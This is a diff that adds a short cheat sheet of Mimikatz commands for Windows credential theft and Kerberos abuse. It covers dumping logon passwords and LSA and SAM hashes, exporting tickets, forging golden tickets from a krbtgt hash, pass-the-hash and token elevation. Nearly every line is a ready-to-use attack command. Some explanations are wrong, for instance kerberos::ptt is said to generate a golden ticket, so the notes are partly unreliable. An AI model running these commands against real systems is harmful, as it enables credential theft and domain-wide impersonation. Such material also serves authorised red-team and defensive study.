@@ -1,0 +1,35 @@
+privilege::debug --> request the debug privilege for the running Mimikatz process
+
+sekurlsa::logonpasswords --> record all users who have recently logged into the system
+
+lsadump::lsa /inject --> extract credentials and other relevant information from the LSA
+
+token::elevate --> obtain the highest system privileges
+
+lsadump::sam --> access to the hashed passwords stored in the SAM database
+
+kerberos::list --> display a list of available Kerberos tickets that are stored in system memory
+
+kerberos::ptt /ticket:<path_to_ticket_file> --> generate golden ticket need the Key Distribution Center (KDC) master key, which derived from hashes of user krbtgt passwords
+
+kerberos::ptt <path_to_ticket_file> --> apply the Kerberos ticket
+
+sekurlsa::tickets --> capture all available Kerberos tickets stored in system memory
+sekurlsa::tickets /export --> add the option /export in the command
+
+The files .kirbi contain the exported Kerberos tickets and can use them to access resources
+
+klist tickets --> load it into system memory
+
+Golden tickets are TGTs (Ticket Granting Tickets) that use the NTLM hash of the domain’s KDC service account (KRBTGT) to sign and encrypt them
+These tickets allow you to impersonate any user in the domain and give you access to every resource
+
+kerberos::golden /domain:<domain> /sid:<domain_sid> /user:<username> /rc4:<krbtgt_hash> /ticket:<path_to_output_ticket>
+
+kerberos::golden /domain:<domain> /sid:<domain_sid> /user:<username> /rc4:<krbtgt_hash> /ptt --> insert the golden ticket into memory
+
+sekurlsa::pth --> Pass-the-Hash
+/impersonate --> create a token in the current Mimikatz session that will impersonate the user
+
+misc::cmd --> open a command prompt from this Mimikatz process
+klist --> displays all the Kerberos tickets you have in your current session
